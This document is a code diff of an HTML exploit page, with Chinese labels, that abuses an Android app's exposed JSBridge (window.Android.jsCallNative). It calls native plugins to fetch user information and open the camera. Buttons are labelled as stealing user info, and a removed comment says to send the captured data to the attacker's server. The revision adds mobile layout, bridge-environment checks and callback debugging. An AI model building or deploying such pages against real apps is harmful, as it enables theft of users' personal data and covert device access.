@@ -2,90 +2,133 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>JSBridge 最终利用代码</title>
+    <!-- 【关键修复1】适配手机端 -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>JSBridge 调试与利用工具</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; padding: 15px; background-color: #f0f2f5; }
+        .container { max-width: 400px; margin: 0 auto; background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #333; font-size: 20px; }
+        button { display: block; width: 100%; padding: 15px; margin: 10px 0; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; -webkit-tap-highlight-color: transparent; }
         button:hover { background-color: #0056b3; }
-        #log { margin-top: 20px; padding: 10px; background: #f5f5f5; border-radius: 4px; white-space: pre-wrap; font-size: 14px; }
-        .success { color: #4CAF50; }
-        .error { color: #f44336; }
+        button:active { transform: scale(0.98); }
+        #log { margin-top: 20px; padding: 10px; background: #f5f5f5; border-radius: 4px; white-space: pre-wrap; font-size: 12px; max-height: 300px; overflow-y: scroll; }
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
+        .info { color: #17a2b8; }
     </style>
     <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
 </head>
 <body>
-    <h1>JSBridge 最终利用代码</h1>
-    <button onclick="testGetUserInfo()">窃取用户信息</button>
-    <button onclick="testOpenCamera()">打开相机</button>
-    <button onclick="testGetLocation()">获取位置</button>
-    <button onclick="clearLog()">清空日志</button>
-
-    <div id="log">等待操作...</div>
+    <div class="container">
+        <h1>JSBridge 调试与利用</h1>
+        
+        <button onclick="checkEnvironment()">1. 检查环境</button>
+        <button onclick="testCallback()">2. 测试 JS 回调</button>
+        <button onclick="testGetUserInfo()">3. 窃取用户信息</button>
+        <button onclick="testOpenCamera()">4. 打开相机</button>
+        <button onclick="clearLog()">清空日志</button>
+        
+        <div id="log">等待操作...</div>
+    </div>
 
     <script>
         new VConsole();
         const logEl = document.getElementById('log');
+        let logCount = 0;
         function log(msg, type = 'info') {
+            logCount++;
             const time = new Date().toLocaleTimeString();
-            const className = type === 'success' ? 'success' : type === 'error' ? 'error' : '';
-            logEl.innerHTML += `<div class="${className}">[${time}] ${msg}</div>`;
+            const className = type === 'success' ? 'success' : type === 'error' ? 'error' : 'info';
+            logEl.innerHTML += `<div class="${className}">[${logCount}] [${time}] ${msg}</div>`;
+            logEl.scrollTop = logEl.scrollHeight; // 自动滚动到底部
         }
-        function clearLog() { logEl.innerHTML = '日志已清空\n'; }
 
-        // 【核心】定义全局回调函数，原生代码会通过名字调用它们
+        function clearLog() {
+            logEl.innerHTML = '日志已清空\n';
+            logCount = 0;
+        }
+
+        // 【核心】定义全局回调函数
         function handleUserInfo(data) {
-            log('🎉 回调 handleUserInfo 成功!', 'success');
-            log(`窃取到的用户信息: ${JSON.stringify(data)}`, 'success');
-            // 在这里将数据发送到你的服务器
+            // 【关键修复2】增加调试信息
+            log('🎉🎉🎉 handleUserInfo 回调被成功触发! 🎉🎉🎉', 'success');
+            log(`原生返回的数据: ${JSON.stringify(data)}`, 'success');
+            // 使用 alert 可以最直观地确认回调是否成功
+            alert('成功获取用户信息! 请查看控制台和日志。');
         }
+        
         function handleCameraResult(data) {
-            log('🎉 回调 handleCameraResult 成功!', 'success');
+            log('🎉🎉🎉 handleCameraResult 回调被成功触发! 🎉🎉🎉', 'success');
             log(`相机操作结果: ${JSON.stringify(data)}`, 'success');
-        }
-        function handleLocationResult(data) {
-            log('🎉 回调 handleLocationResult 成功!', 'success');
-            log(`位置信息: ${JSON.stringify(data)}`, 'success');
+            alert('相机回调成功! 请查看控制台和日志。');
         }
 
-        // 【核心】调用 PLUTO/IRS 插件的通用函数
+        // 调用 PLUTO/IRS 插件的通用函数
         function callPlutoPlugin(pluginName, params, callbackName) {
-            if (!window.Android || !window.Android.jsCallNative) {
-                log('❌ window.Android.jsCallNative 不存在', 'error');
+            log(`--- 准备调用插件: ${pluginName} ---`, 'info');
+            if (!window.Android) {
+                log('❌ 错误: window.Android 对象不存在!', 'error');
                 return;
             }
-            log(`--- 调用 PLUTO 插件: ${pluginName} ---`);
+            if (!window.Android.jsCallNative) {
+                log('❌ 错误: window.Android.jsCallNative 方法不存在!', 'error');
+                return;
+            }
+            
             try {
                 const payload = {
                     method: pluginName,
                     data: params
                 };
+                log(`发送的Payload: ${JSON.stringify(payload)}`, 'info');
                 window.Android.jsCallNative(JSON.stringify(payload), callbackName);
-                log('✅ 已发起调用，等待回调...');
+                log('✅ JS调用已成功发起，等待Native回调...', 'info');
             } catch (e) {
                 log(`❌ 调用失败: ${e.message}`, 'error');
+            }
+        }
+        
+        // 【新增】环境检查函数
+        function checkEnvironment() {
+            clearLog();
+            log('=== 开始检查环境 ===', 'info');
+            log(`window.Android 是否存在: ${!!window.Android}`, window.Android ? 'success' : 'error');
+            if (window.Android) {
+                log(`window.Android.jsCallNative 是否存在: ${!!window.Android.jsCallNative}`, window.Android.jsCallNative ? 'success' : 'error');
+                log(`window.Android.H2C_JSBridge 是否存在: ${!!window.Android.H2C_JSBridge}`, window.Android.H2C_JSBridge ? 'success' : 'error');
+            }
+            log(`window.handleUserInfo 是否存在: ${!!window.handleUserInfo}`, window.handleUserInfo ? 'success' : 'error');
+            log('=== 环境检查完成 ===', 'info');
+        }
+
+        // 【新增】直接测试JS回调函数
+        function testCallback() {
+            clearLog();
+            log('=== 测试 JS 回调函数本身 ===', 'info');
+            if (window.handleUserInfo) {
+                log('✅ handleUserInfo 函数存在，尝试直接调用...', 'info');
+                const testData = { code: "0", message: "This is a test from JS itself.", data: { test: "OK" } };
+                window.handleUserInfo(testData);
+            } else {
+                log('❌ handleUserInfo 函数不存在!', 'error');
             }
         }
 
         function testGetUserInfo() {
             clearLog();
-            // getUserInfo 是 PLUTO 插件
             callPlutoPlugin('getUserInfo', {}, 'handleUserInfo');
         }
 
         function testOpenCamera() {
             clearLog();
-            // openCamera 是 IRS 插件
             callPlutoPlugin('openCamera', {}, 'handleCameraResult');
         }
 
-        function testGetLocation() {
-            clearLog();
-            // location 是 PLUTO 插件
-            callPlutoPlugin('location', {}, 'handleLocationResult');
-        }
-
+        // 页面加载时自动检查环境
         window.onload = () => {
-            log('页面加载完成，点击按钮开始攻击');
+            log('页面加载完成', 'info');
+            checkEnvironment();
         };
     </script>
 </body>
